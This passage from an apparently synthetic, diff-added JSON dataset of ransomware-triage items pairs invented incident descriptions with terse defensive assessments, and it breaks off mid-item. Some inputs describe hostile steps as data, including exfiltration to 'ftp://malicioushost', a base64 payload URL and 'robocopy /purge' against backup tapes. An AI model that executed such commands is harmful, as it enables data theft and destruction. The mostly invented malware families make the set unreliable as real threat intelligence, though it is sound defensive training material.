+    "Input": "User files replaced with .phaselock. Ransom: 2 BTC or 'years of research lost.'",
+    "Output": "RaaS specifically targeting HPC. Could hamper massive data sets. Immediate HPC isolation, partial data salvage from backups.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "PhaseLock",
+      "platform": "Linux HPC",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'CryptoSpear' macro-laden Excel docs are from a RaaS affiliate employing spear-phishing for initial access.",
+    "Input": "Targeted CFO email with .xlsm, runs 'CryptoSpearLoader,' after which .cspear extension found. Ransom: 1 BTC.",
+    "Output": "Spear-phishing RaaS. CFO targeted for maximum damage. Quarantine CFO device, check email logs for further infiltration.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "CryptoSpear",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Assess if the compromised backup server logs show 'Purge.exe' removing older snapshots prior to 'LockDrive' encryption spree.",
+    "Input": "Backup server job replaced with Purge.exe. Then LockDrive.exe ran, .ld extension on all volumes. 3 BTC demanded.",
+    "Output": "RaaS technique: sabotage backups, then encrypt. Must rely on offline or offsite backups. Widespread compromise likely.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockDrive",
+      "platform": "Windows Server",
+      "kill_chain_phase": "Inhibit System Recovery"
+    }
+  },
+  {
+    "Instruction": "Check if 'BreachEx' left a chat ID in the ransom note for 'live negotiations,' typical of RaaS personal affiliate approach.",
+    "Input": "\"All data locked by BreachEx. Join chat ID #1122 on our site for negotiation. 2.2 BTC to restore.\"",
+    "Output": "RaaS negotiation channel. Standard practice for affiliates. Prepare IR approach, possibly legal counsel for negotiations.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "BreachEx",
+      "platform": "Windows",
+      "kill_chain_phase": "Command & Control"
+    }
+  },
+  {
+    "Instruction": "Analyze the leftover 'K1llerRansom' process using GPU resources for file encryption, suspect advanced RaaS technique.",
+    "Input": "Process k1llerRansom.exe aggressively encrypts large video files, demanding $8k in BTC. GPU usage spikes for parallel encryption.",
+    "Output": "Yes, advanced RaaS harnessing GPU for faster encryption. Must isolate system, find offline backups quickly.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "K1llerRansom",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Review a new variant 'DocuCrush' that specifically targets PDF & Word docs, typical RaaS specializing in office docs.",
+    "Input": "DocuCrush leaves .docu extension on .pdf/.docx, ignoring other files. Ransom: 1.5 BTC or data leaked.",
+    "Output": "RaaS focusing on business-critical docs. Must see if backups exist for these essential files, isolate further spread.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DocuCrush",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if 'HyperLock' logs referencing meltdown exploit is a RaaS attempt to gain kernel access for deeper encryption.",
+    "Input": "Evidence of meltdown PoC run, then hyperlock_svc installed, .hplk extension found. 3 BTC demand.",
+    "Output": "RaaS affiliate exploiting meltdown for privileged encryption. Critical high severity, extensive patching & IR needed.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "HyperLock",
+      "platform": "Windows",
+      "kill_chain_phase": "Exploitation"
+    }
+  },
+  {
+    "Instruction": "Analyze if the leftover 'CronEncrypt.sh' on multiple Unix servers is a RaaS wave, each user folder is .blocked.",
+    "Input": "Cron job runs nightly, calling 'CronEncrypt.sh'. Ransom note: 'You have 48h, pay 2 BTC to unlock.'",
+    "Output": "Yes, RaaS on Unix via malicious cron. Remove cron, revert from backups, handle domain credentials if compromised.",
+    "Sentiment": "Negative",
+    "Score": 0.87,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "CronEncrypt",
+      "platform": "Unix/Linux",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Check if 'NetLock' found scanning SMB shares is a RaaS tool used by an affiliate for multi-machine encryption at once.",
+    "Input": "NetLock enumerates all IPs in 10.0.0.* range, then triggers encryption with .netlk extension. Ransom: 2 BTC.",
+    "Output": "RaaS scanning approach. Must block outbound SMB, isolate infected segment, begin mass recovery efforts.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "NetLock",
+      "platform": "Windows SMB",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'RyukLite' is a RaaS affiliate that left partial backups intact but threatened to leak data anyway.",
+    "Input": "RyukLite note: 'We only locked 50% of your data to prove seriousness. Pay 3 BTC or we do 100% next time.'",
+    "Output": "Yes, partial encryption threat from RaaS. They might do second wave if not paid. IR must address root cause quickly.",
+    "Sentiment": "Negative",
+    "Score": 0.89,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RyukLite",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Assess 'RenLock' which attacked remote desktops, forcibly installing a spinoff encryption module for 2.5 BTC demand.",
+    "Input": "RenLock logs show RDP logins from unknown IP, launched 'ren_lock.exe' that changes all extensions to .rlk.",
+    "Output": "RaaS infiltration via RDP. Common technique. Immediate RDP lockdown, rotating credentials, investigate network for lateral moves.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RenLock",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Check if the domain admin discovered 'EFilter' script that exfiltrates key files before encryption belongs to RaaS affiliate.",
+    "Input": "EFilter logs: copying top 100 largest files to ftp://malicioushost, then launching 'encrypt.bat'. Ransom demanded in readme.",
+    "Output": "RaaS double extortion. Exfil + encryption. Must handle data breach plus system lockdown, strong IR measures needed.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "EFilter",
+      "platform": "Windows",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Analyze the leftover 'Lock2Pay' logs on an old XP machine that wasn't updated. RaaS affiliate infiltration?",
+    "Input": "Lock2Pay appended .l2p to all docs, machine is legacy XP with no patches. Ransom: $800 in BTC.",
+    "Output": "Yes, RaaS targeting unpatched XP is easy pickings. Quarantine, attempt manual file restore from backups.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "Lock2Pay",
+      "platform": "Windows XP",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if 'DE_Forge' found on a build server is a RaaS affiliate tactic to push encryption across dev environment.",
+    "Input": "Build server runs 'de_forge.exe' after compromised credentials, dev source files .forge extension. $10k ransom.",
+    "Output": "Yes, RaaS focusing dev environment. Source code possibly stolen. Secure build pipeline, rotate secrets, IR crucial.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DE_Forge",
+      "platform": "Windows Build Server",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Review if the note from 'NemesisKey' referencing big game hunting a major enterprise is standard RaaS approach for high payout.",
+    "Input": "\"NemesisKey: We locked your entire domain. 10 BTC or we release major financial data. Your call.\"",
+    "Output": "Big game hunting by NemesisKey. Large ransom sum typical for enterprise. Full IR engagement needed.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "NemesisKey",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if a new 'CoreRansom' strain on backup NAS systems is a RaaS affiliate leveraging known Samba bug to encrypt entire NAS.",
+    "Input": "CoreRansom exploited Samba CVE. All shares now .core. Ransom: 3 BTC or data leak threat.",
+    "Output": "Yes, RaaS using Samba vulnerability. Must patch Samba, treat entire NAS as compromised. Attempt offline restore.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "CoreRansom",
+      "platform": "Linux NAS",
+      "kill_chain_phase": "Exploitation"
+    }
+  },
+  {
+    "Instruction": "Analyze 'GreenLock' discovered in a cloud container orchestrator, suggests RaaS infiltration of Kubernetes nodes.",
+    "Input": "GreenLock container image found pulling from malicious registry. Worker pods have .glock extension. 2 BTC demanded.",
+    "Output": "RaaS in Kubernetes environment. Container-level encryption. Must remove malicious pods, rotate secrets, restore from backups.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "GreenLock",
+      "platform": "Kubernetes/Linux",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if the 'DarkKnox' logs reveal a RaaS group's TTP of leaving partial freebies to prove decryption ability.",
+    "Input": "\"DarkKnox left some files decrypted as a sample. Email them for proof. Full decrypt requires 2.3 BTC.\"",
+    "Output": "Yes, a typical RaaS tactic of partial freebies. Possibly fosters trust to encourage ransom payment.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DarkKnox",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Assess if the domain infected with 'SparkLock' is RaaS-based, using domain admin compromise to push GPO-deployed encryption.",
+    "Input": "SparkLock claims 'All domain files locked. Pay 3.5 BTC or meltdown ensues.' GPO logs confirm malicious script.",
+    "Output": "RaaS infiltration, domain-wide. GPO used to run encryption. Full domain compromise. Steps: domain reset, offline backups.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SparkLock",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Check if a newly minted binary 'AlphaLock' found on user laptops is a RaaS affiliate focusing on personal data exfil prior to encryption.",
+    "Input": "AlphaLock took local personal docs, exfil via ftp. Then .alock extension created, note demands 1 BTC from each user.",
+    "Output": "RaaS targeting individuals for smaller payments. Summation can be large. IR must handle data privacy risk.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "AlphaLock",
+      "platform": "Windows Laptops",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Analyze if the discovered 'SiphonRansom' strain uses automated scanning for unpatched systems as part of RaaS distribution.",
+    "Input": "SiphonRansom attempts EternalBlue exploit, then runs .siph encryption. Note demands $15k in BTC.",
+    "Output": "RaaS leveraging known exploit to spread. Patch all systems, block lateral movement, IR engagement essential.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SiphonRansom",
+      "platform": "Windows",
+      "kill_chain_phase": "Exploitation"
+    }
+  },
+  {
+    "Instruction": "Evaluate 'ZLock32' which specifically targets 32-bit Windows hosts in a RaaS affiliate scheme.",
+    "Input": "ZLock32 sees only 32-bit OS processes, encrypts .z32 extension. Ransom: 0.8 BTC, smaller demands for smaller hosts.",
+    "Output": "Yes, RaaS focusing older OS for easy infiltration. Must isolate or retire 32-bit systems. Attempt known decrypt tools if any.",
+    "Sentiment": "Negative",
+    "Score": 0.87,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ZLock32",
+      "platform": "Windows 32-bit",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if 'BetaLock' discovered in BFS (Big File Storage) environment is a RaaS wave encrypting large media archives.",
+    "Input": "BetaLock encryption soared CPU usage on BFS node, .blt extension found. Ransom says '2 BTC or we leak your media.'",
+    "Output": "RaaS on BFS with large media. Possibly leads to big data extortion. Immediate BFS node isolation, offline restore recommended.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "BetaLock",
+      "platform": "Linux BFS",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if the leftover 'ShadowEx' note referencing user credentials means the RaaS group compromised domain accounts prior to encryption.",
+    "Input": "\"We own domain accounts. ShadowEx does not bluff. Pay 2 BTC or all AD data is leaked.\"",
+    "Output": "Yes, RaaS group claiming domain accounts stolen. IR must treat it as both encryption & credential compromise scenario.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ShadowEx",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Assess if 'KillSwitch' logs on a finance app server forcibly unmounted volumes before encryption, typical RaaS sabotage.",
+    "Input": "KillSwitch script: unmount volumes, then run local encryption on offline data. Ransom 3 BTC. Minimal detection chance.",
+    "Output": "RaaS sabotage technique. Finance server heavily impacted. Must forcibly re-mount from safe backups, investigate vector.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "KillSwitch",
+      "platform": "Linux Finance Server",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'Q-Lock' found stealthily enumerating backups on tape library is a RaaS affiliate removing offline backups next.",
+    "Input": "Q-Lock used 'robocopy /purge' on tape drives, then mass encryption of active data. Ransom: 6 BTC.",
+    "Output": "Yes, advanced RaaS destroying backup tapes, typical sabotage. Must check offsite tapes or older cycle backups.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "Q-Lock",
+      "platform": "Windows Backup System",
+      "kill_chain_phase": "Inhibit System Recovery"
+    }
+  },
+  {
+    "Instruction": "Check if the leftover 'SigmaCrypt' note referencing 'If you have insurance, pay more' is part of a RaaS approach to extort cyber-insured companies.",
+    "Input": "\"SigmaCrypt: We know you have insurance coverage. Demand is 1.5 BTC or 2 BTC if insured— your call.\"",
+    "Output": "Yes, RaaS group adjusting ransom demands for insured victims. Must coordinate with insurance carefully, confirm coverage.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SigmaCrypt",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if 'TurbineRansom' found in logs rewriting MBR is an extreme RaaS tactic for destructive boot-level encryption.",
+    "Input": "MBR overwritten to display ransom note at boot. System won't start OS. Demands 4 BTC for 'unlock code.'",
+    "Output": "Destructive RaaS at MBR level. Highly critical. Must attempt specialized MBR repair or reimage, no standard decrypt free tool known.",
+    "Sentiment": "Negative",
+    "Score": 0.96,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "TurbineRansom",
+      "platform": "Windows Boot",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'aHR0cDovL3JhbnNvbQ==' snippet in a batch script is a RaaS approach encoding the URL for final payload retrieval.",
+    "Input": "Decodes to 'http://ransom[...]'. Then runs main encryption. Ransom note: 'AlphaCrew demands 3 BTC.'",
+    "Output": "Base64-encoded RaaS payload. Must block domain, remove script, confirm no further infiltration. Typical stealth tactic.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "AlphaCrew",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Review 'GammaKey' infiltration logs: domain admin compromised, BFS shares fully .gamma, note threatens daily leak increments.",
+    "Input": "\"GammaKey says pay 5 BTC or 10% data leak daily. BFS shares all encrypted. Admin password was stolen.\"",
+    "Output": "Yes, RaaS big game approach. BFS shares impacted, daily leak tactic. Full domain meltdown. IR must prioritize re-securing domain.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "GammaKey",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if 'LockSage' partial infiltration on Mac endpoints used an MDM push to run encryption, typical RaaS approach for mass coverage.",
+    "Input": "MDM logs show policy to install locksage.dmg. Mac files get .sage extension. Ransom: 1 BTC per device.",
+    "Output": "RaaS infiltration via MDM. Must revoke MDM cert, isolate impacted Macs, check if data exfil occurred. High severity.",
+    "Sentiment": "Negative",
+    "Score": 0.89,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockSage",
+      "platform": "macOS",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'ByteEx' leftover script with references to TS (terminal services) indicates RaaS spread via TS sessions.",
+    "Input": "ByteEx uses 'tscon' commands to pivot, then .bex extension on user profiles. Ransom 2.2 BTC total.",
+    "Output": "RaaS lateral movement via Terminal Services. Must lock down TS, remove ByteEx, see if partial decrypt is possible.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ByteEx",
+      "platform": "Windows Terminal Services",
+      "kill_chain_phase": "Lateral Movement"
+    }
+  },
+  {
+    "Instruction": "Determine if an HPC environment compromised by 'FateCrypt' RaaS uses GPU encryption modules for giant data sets.",
+    "Input": "FateCrypt forcibly encrypts HPC project directories with .fate extension, GPU usage spiking on compute nodes.",
+    "Output": "Yes, HPC-targeted RaaS. GPU-accelerated encryption. Must isolate HPC cluster, possibly huge data loss if no backup.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "FateCrypt",
+      "platform": "Linux HPC",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if 'AlphaToxin' found on Exchange server is a RaaS initial vector used for domain infiltration.",
+    "Input": "Email attachments run alpha_toxin.exe, capturing domain credentials, then mass file encryption with .toxin extension.",
+    "Output": "RaaS infiltration via compromised Exchange, typical approach. Must isolate Exchange, reset domain creds, proceed with IR.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "AlphaToxin",
+      "platform": "Windows Exchange",
+      "kill_chain_phase": "Exploitation"
+    }
+  },
+  {
+    "Instruction": "Analyze if leftover 'ChainRX' note referencing 'We've your CFO emails' means a RaaS group exfiltrated CFO mailbox before encryption.",
+    "Input": "\"ChainRX here. CFO mailbox is ours. Pay 3 BTC or your deals & letters go public. .chainrx on all docs.\"",
+    "Output": "Double extortion. CFO mailbox exfil + encryption. Must evaluate data breach, handle ransom decisions carefully.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ChainRX",
+      "platform": "Windows",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Assess 'RaaSKit' logs from an open-source tool that affiliates use to assemble customized encryption payloads. Found in dev folder.",
+    "Input": "RaaSKit.exe builder discovered in dev folder, referencing multiple encryption options & custom ransom notes.",
+    "Output": "Yes, a known RaaS builder kit. Hard evidence affiliates used local dev environment to create malicious payloads.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RaaSKit",
+      "platform": "Windows",
+      "kill_chain_phase": "Weaponization"
+    }
+  },
+  {
+    "Instruction": "Decide if the new strain 'OpenHole' found on a Linux-based web server is a RaaS affiliate using partial file corruption tactic for leverage.",
+    "Input": "OpenHole overwrote half of each file, leaving a portion intact. Ransom note: 'Pay 1 BTC to fix partial corruption.'",
+    "Output": "RaaS partial corruption approach for forcing payment. Might not be fully decryptable. Urgent restore from known backups.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "OpenHole",
+      "platform": "Linux Web Server",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if 'BlackBeam' infiltration used powershell script from a malicious GPO to run ephemeral encryption on user data daily, typical RaaS affiliate approach.",
+    "Input": "Daily at 1 AM, 'blackbeam.ps1' re-encrypts new files. Ransom: 2 BTC each day or total meltdown.",
+    "Output": "Yes, recurring encryption tactic. RaaS affiliate controlling GPO. Must remove script, revert GPO, begin IR.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "BlackBeam",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Persistence"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'SecuraPay' logs reference a RaaS group that specifically hunts financial data before encryption for blackmail.",
+    "Input": "SecuraPay script grabs financial spreadsheets, exfil them, then .sec ext on all drives. Threatens public release.",
+    "Output": "RaaS double extortion focusing finance. High-risk data. IR must handle breach and encryption. Possibly major compliance issues.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SecuraPay",
+      "platform": "Windows",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Determine if 'HiveLock' discovered on multiple HPC nodes is a RaaS affiliate saturating CPU for high-speed encryption of large scientific data.",
+    "Input": "HiveLock uses multi-thread encryption, HPC usage at 100%. Filenames now .hivelock. Ransom 5 BTC total.",
+    "Output": "Yes, HPC-specific RaaS. Multi-thread approach on HPC is catastrophic. Must isolate nodes, restore from offline backups.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "HiveLock",
+      "platform": "Linux HPC",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if the discovered config file 'config.json' belongs to a RaaS client referencing affiliate ID #335, pointed at Tor C2.",
+    "Input": "config.json: { \"affiliate_id\": 335, \"tor_url\": \"hxxp://abcd.onion/\" ... }. Also sets 'extension': \".rdy\"",
+    "Output": "Yes, typical RaaS config. Contains affiliate ID, encryption extension. Must remove config, isolate system. Data likely locked.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "GenericRaaSClient",
+      "platform": "Windows",
+      "kill_chain_phase": "Command & Control"
+    }
+  },
+  {
+    "Instruction": "Analyze the leftover 'TrojanExchanger' that dropped 'LockMiner' RaaS payload, combining cryptomining and encryption for extortion.",
+    "Input": "TrojanExchanger first mined crypto, then triggered LockMiner for files. Ransom: $1k, plus miner persists in background.",
+    "Output": "Hybrid approach: RaaS plus cryptominer. Must remove both, restore data, block malicious addresses. High severity threat.",
+    "Sentiment": "Negative",
+    "Score": 0.89,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockMiner",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Determine if 'SentryKey' infiltration used an MBR wiper fallback if ransom not paid, typical advanced RaaS approach.",
+    "Input": "SentryKey note warns: 'Non-payment triggers MBR wipe at day 3.' Partial proof in code snippet. Ransom 2.8 BTC.",
+    "Output": "Yes, destructive fallback. High-pressure tactic. Must ensure offline backups, consider negotiation or reimaging strategy.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SentryKey",
+      "platform": "Windows Boot",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Review if new iteration 'LockBitPro' found in ePO logs is a RaaS affiliate tactic with advanced obfuscation for AV bypass.",
+    "Input": "LockBitPro uses reflection injection, ePO shows mass encryption attempts, .lbp extension. 4 BTC demanded.",
+    "Output": "Upgraded RaaS from LockBit family. Obfuscation for AV evasion. Elevated threat level. IR must handle quickly.",
+    "Sentiment": "Negative",
+    "Score": 0.96,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockBitPro",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Check if leftover 'Criptex' note indicates a RaaS affiliate calling themselves 'EliteCrew,' citing victim's annual revenue as leverage.",
+    "Input": "\"EliteCrew sees your revenue is $10M. We want $300k in BTC or we leak all your client data. #Criptex!\"",
+    "Output": "RaaS group targeting bigger revenue for bigger demand. A typical 'big game hunting' approach, severe extortion scenario.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "Criptex",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'SilentBit' infiltration leverages onedrive sync to remove local backups prior to encryption, typical of RaaS affiliate TTP.",
+    "Input": "SilentBit script forcibly syncs changes to OneDrive, removing older file versions. Then local .sbit extension appears.",
+    "Output": "Yes, sabotage cloud backups. RaaS TTP for oneDrive or other cloud. Must revert to older snapshots if possible, isolate sync.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SilentBit",
+      "platform": "Windows OneDrive",
+      "kill_chain_phase": "Inhibit System Recovery"
+    }
+  },
+  {
+    "Instruction": "Determine if new 'MarshalLock' logs referencing a 'rebrand of Revil' is a RaaS affiliate resurrecting old code base.",
+    "Input": "MarshalLock demands 2 BTC, code strings match old Revil. Calls itself 'Revil Reborn.'",
+    "Output": "Yes, rebrand approach. Typically old Revil code revived. Same RaaS tactics. IR must treat as advanced threat.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MarshalLock (Revil Reborn)",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Assess if 'NoExFile' discovered on domain controllers is a RaaS tool that forcibly kills security processes to ensure encryption success.",
+    "Input": "NoExFile kills Windows Defender, Sysmon, then runs .nex ext. Ransom 3 BTC or data leak.",
+    "Output": "Yes, RaaS defense evasion. Must re-enable security, do wide forensic for root cause, reimage DC if needed.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "NoExFile",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Defense Evasion"
+    }
+  },
+  {
+    "Instruction": "Check if the random extension .xe2 on ICS historians is from 'ExRaaS 2.0' that demands 8 BTC for critical SCADA data decryption.",
+    "Input": "Historians see .xe2 locked. ExRaaS 2.0 note: 'We have your SCADA logs. Pay or plant stays offline.'",
+    "Output": "RaaS hitting ICS environment again. Critical OT disruption. Must isolate SCADA segment, attempt specialized ICS IR.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ExRaaS 2.0",
+      "platform": "Windows ICS Historians",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'LoJackLock' infiltration is a RaaS technique hooking the UEFI or BIOS for persistent encryption re-trigger after OS reinstall.",
+    "Input": "Systems show BIOS mod referencing LoJackLock. Reformat didn't fix encryption. Ransom 3 BTC. Possibly boot-level rootkit.",
+    "Output": "Yes, advanced RaaS hooking firmware. Ultra persistent. Must flash BIOS, reimage from known safe environment.",
+    "Sentiment": "Negative",
+    "Score": 0.97,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LoJackLock",
+      "platform": "Firmware/BIOS",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Decide if leftover 'shell_lateral.ps1' indicates a RaaS affiliate's pivot to all mapped drives, typical of broad encryption spree.",
+    "Input": "\"shell_lateral.ps1 /encryptall\" found in admin share, runs systematically across mapped drives. Ransom note = 'LockStar.'",
+    "Output": "LockStar RaaS pivot script. Systematic mapped drive encryption. Must unmap drives, isolate admin share, restore data.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockStar",
+      "platform": "Windows",
+      "kill_chain_phase": "Lateral Movement"
+    }
+  },
+  {
+    "Instruction": "Check if 'SigmaTear' discovered in HPC job queue is a RaaS attempt to run mass encryption across HPC data nodes.",
+    "Input": "SigmaTear job executed 'encrypt_all.sh' on HPC. .sgt extension on large research data sets. Ransom 5 BTC.",
+    "Output": "Yes, HPC environment RaaS infiltration. Potential research data loss. HPC must be quarantined, backups mandatory.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SigmaTear",
+      "platform": "Linux HPC",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze 'DocEx Lock' infiltration triggered by malicious DocuSign phishing, typical RaaS chain reaction.",
+    "Input": "DocuSign link -> docex_lock.exe -> .docex extension. Note says 'Pay 1 BTC in 48h or lose docs forever.'",
+    "Output": "Classic RaaS chain from DocuSign spoof phishing. IR must do user training, check backups, remove docex_lock.exe.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DocEx Lock",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Determine if leftover 'EdgeLock' is a RaaS threat focusing on edge routers and encrypting SMB shares from outside in.",
